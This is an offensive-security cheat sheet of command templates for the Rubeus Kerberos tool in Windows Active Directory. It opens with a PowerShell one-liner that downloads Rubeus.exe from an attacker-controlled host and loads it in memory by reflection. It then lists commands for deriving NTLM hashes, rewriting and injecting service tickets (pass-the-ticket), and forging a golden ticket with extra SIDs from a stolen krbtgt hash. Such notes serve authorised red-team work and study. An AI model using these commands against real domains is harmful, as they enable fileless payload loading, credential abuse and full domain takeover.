# rubeus

% ad, windows, rubeus

#plateform/windows #target/local 

## load rubeus from powershell
#cat/UTILS 
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://<local_ip>:<port|80>/<dl_rubeus_path>Rubeus.exe');$assem = [System.Reflection.Assembly]::Load($data);
```
= dl_rubeus_path: windows/NetFramework_4.7_x64/

## execute rubeus from powershell
#cat/UTILS 
```powershell
[Rubeus.Program]::MainString("klist");
```
## Rubeus Reflection assembly
#cat/ATTACK/EXPLOIT 
```powershell
[Rubeus.Program]::Main("<rubeus_cmd>".Split())
```

## redirect output
```
/consoleoutfile:<file_path>
```


## Misc - get ntlm hash from password
#cat/POSTEXPLOIT/CREDS_RECOVER 
```
.\Rubeus.exe hash /password:<password>
```

## Misc - change TGS service name
#cat/ATTACK/EXPLOIT 
```powershell
.\Rubeus.exe tgssub /ticket:<kirbi_path_or_b64_blob> /altservice:<service|cifs>/<target>  /nowrap
```

## Misc - change TGS service name and inject it
#cat/ATTACK/EXPLOIT 
```powershell
.\Rubeus.exe tgssub /ticket:<kirbi_path_or_b64_blob> /altservice:<service|cifs>/<target>  /nowrap /ptt
```

## golden - with extra_sid
enter-pssession dst_domain_computer_fqdn
```powershell
 .\Rubeus.exe golden /user:Administrator /domain:<src_domain_fqdn> /sid:src_domain_sid> /sids:<dst_domain_sid>-<rid> /rc4:<src_krbtgt_nthash> /ptt
```
